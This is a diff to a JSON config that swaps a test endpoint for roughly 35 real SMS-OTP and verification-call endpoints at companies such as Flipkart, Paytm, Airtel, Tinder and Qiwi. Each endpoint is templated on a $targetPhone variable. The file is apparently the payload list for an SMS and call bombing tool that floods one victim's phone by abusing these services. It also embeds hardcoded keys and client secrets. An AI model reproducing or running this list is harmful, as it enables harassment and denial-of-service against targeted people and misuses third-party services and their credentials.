@@ -2,14 +2,399 @@
   "version": 1,
   "endpoints": [
     {
-      "id": "test_1",
+      "id": "confirmtkt_call",
       "type": "SMS",
-      "url": "https://httpbin.org/post",
+      "url": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber=$targetPhone",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
+      },
+      "body": "",
+      "enabled": true
+    },
+    {
+      "id": "justdial_sms",
+      "type": "SMS",
+      "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=$targetPhone",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
+      },
+      "body": "",
+      "enabled": true
+    },
+    {
+      "id": "allensolly_sms",
+      "type": "SMS",
+      "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": "mobileoremail=$targetPhone&name=markluther",
+      "enabled": true
+    },
+    {
+      "id": "frotels_sms",
+      "type": "SMS",
+      "url": "https://www.frotels.com/appsendsms.php",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobno=$targetPhone",
+      "enabled": true
+    },
+    {
+      "id": "gapoon_sms",
+      "type": "SMS",
+      "url": "https://www.gapoon.com/userSignup",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile=$targetPhone&email=noreply@gmail.com&name=LexLuthor",
+      "enabled": true
+    },
+    {
+      "id": "housing_sms",
+      "type": "SMS",
+      "url": "https://login.housing.com/api/v2/send-otp",
       "method": "POST",
       "headers": {
         "Content-Type": "application/json"
       },
       "body": "{\"phone\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "porter_sms",
+      "type": "SMS",
+      "url": "https://porter.in/restservice/send_app_link_sms",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"phone\":\"$targetPhone\",\"referrer_string\":\"\",\"brand\":\"porter\"}",
+      "enabled": true
+    },
+    {
+      "id": "cityflo_sms",
+      "type": "SMS",
+      "url": "https://cityflo.com/website-app-download-link-sms/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile_number=$targetPhone",
+      "enabled": true
+    },
+    {
+      "id": "nnnow_sms",
+      "type": "SMS",
+      "url": "https://api.nnnow.com/d/api/appDownloadLink",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"mobileNumber\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "ajio_sms",
+      "type": "SMS",
+      "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"firstName\":\"xxps\",\"login\":\"wiqpdl223@wqew.com\",\"password\":\"QASpw@1s\",\"genderType\":\"Male\",\"mobileNumber\":\"$targetPhone\",\"requestType\":\"SENDOTP\"}",
+      "enabled": true
+    },
+    {
+      "id": "happyeasygo_sms",
+      "type": "SMS",
+      "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20$targetPhone",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": "",
+      "enabled": true
+    },
+    {
+      "id": "unacademy_sms",
+      "type": "SMS",
+      "url": "https://unacademy.com/api/v1/user/get_app_link/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"phone\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "treebo_sms",
+      "type": "SMS",
+      "url": "https://www.treebo.com/api/v2/auth/login/otp/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"phone_number\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "airtel_sms",
+      "type": "SMS",
+      "url": "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn=$targetPhone",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": "",
+      "enabled": true
+    },
+    {
+      "id": "pharmeasy_sms",
+      "type": "SMS",
+      "url": "https://pharmeasy.in/api/auth/requestOTP",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"contactNumber\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "mylescars_sms",
+      "type": "SMS",
+      "url": "https://www.mylescars.com/usermanagements/chkContact",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "contactNo=$targetPhone",
+      "enabled": true
+    },
+    {
+      "id": "grofers_sms",
+      "type": "SMS",
+      "url": "https://grofers.com/v2/accounts/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
+      },
+      "body": "user_phone=$targetPhone",
+      "enabled": true
+    },
+    {
+      "id": "dream11_sms",
+      "type": "SMS",
+      "url": "https://api.dream11.com/sendsmslink",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "siteId=1&mobileNum=$targetPhone&appType=androidfull",
+      "enabled": true
+    },
+    {
+      "id": "cashify_sms",
+      "type": "SMS",
+      "url": "https://www.cashify.in/api/cu01/v1/app-link?mn=$targetPhone",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": "",
+      "enabled": true
+    },
+    {
+      "id": "paytm_sms",
+      "type": "SMS",
+      "url": "https://commonfront.paytm.com/v4/api/sendsms",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "phone=$targetPhone&guid=2952fa812660c58dc160ca6c9894221d",
+      "enabled": true
+    },
+    {
+      "id": "flipkart_sms",
+      "type": "SMS",
+      "url": "https://www.flipkart.com/api/5/user/otp/generate",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
+        "Origin": "https://www.flipkart.com"
+      },
+      "body": "loginId=%2B91$targetPhone",
+      "enabled": true
+    },
+    {
+      "id": "qlean_sms",
+      "type": "SMS",
+      "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"phone\":\"91$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "mailru_sms",
+      "type": "SMS",
+      "url": "https://cloud.mail.ru/api/v2/notify/applink",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"phone\":\"+91$targetPhone\",\"api\":\"2\",\"email\":\"email\",\"x-email\":\"x-email\"}",
+      "enabled": true
+    },
+    {
+      "id": "tinder_sms",
+      "type": "SMS",
+      "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"phone_number\":\"91$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "youla_sms",
+      "type": "SMS",
+      "url": "https://youla.ru/web-api/auth/request_code",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"phone\":\"+91$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "ivi_sms",
+      "type": "SMS",
+      "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "phone=91$targetPhone",
+      "enabled": true
+    },
+    {
+      "id": "delitime_sms",
+      "type": "SMS",
+      "url": "https://api.delitime.ru/api/v2/signup",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "SignupForm%5Busername%5D=91$targetPhone&SignupForm%5Bdevice_type%5D=3",
+      "enabled": true
+    },
+    {
+      "id": "icq_sms",
+      "type": "SMS",
+      "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "msisdn=91$targetPhone&locale=en&k=ic1rtwz1s1Hj1O0r&r=45559",
+      "enabled": true
+    },
+    {
+      "id": "qiwi_sms",
+      "type": "SMS",
+      "url": "https://mobile-api.qiwi.com/oauth/authorize",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "response_type=urn%3Aqiwi%3Aoauth%3Aresponse-type%3Aconfirmation-id&username=91$targetPhone&client_id=android-qw&client_secret=zAm4FKq9UnSe7id",
+      "enabled": true
+    },
+    {
+      "id": "redbus_sms",
+      "type": "SMS",
+      "url": "https://m.redbus.in/api/getOtp?number=$targetPhone&cc=91&whatsAppOpted=false",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
+      },
+      "body": "",
+      "enabled": true
+    },
+    {
+      "id": "newtonschools_sms",
+      "type": "SMS",
+      "url": "https://my.newtonschool.co/api/v1/user/otp/?registration=true",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"phone\":\"+91$targetPhone\"}",
+      "enabled": true
+    },
+
+    {
+      "id": "makaan_call",
+      "type": "CALL",
+      "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/$targetPhone?callType=otpOnCall",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": "",
+      "enabled": true
+    },
+    {
+      "id": "magicbricks_call",
+      "type": "CALL",
+      "url": "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=$targetPhone",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": "",
+      "enabled": true
+    },
+    {
+      "id": "realestateindia_call",
+      "type": "CALL",
+      "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "x-requested-with": "XMLHttpRequest",
+        "referer": "https://www.realestateindia.com/thanks.php?newreg"
+      },
+      "body": "action_id=call_to_otp&mob_num=$targetPhone&member_id=1547045",
+      "enabled": true
+    },
+    {
+      "id": "careers360_call",
+      "type": "CALL",
+      "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "https://www.careers360.com",
+        "Referer": "https://www.careers360.com/user/otp-verify/",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36"
+      },
+      "body": "mobile_number=$targetPhone&method=call&uid=12692588",
       "enabled": true
     }
   ]
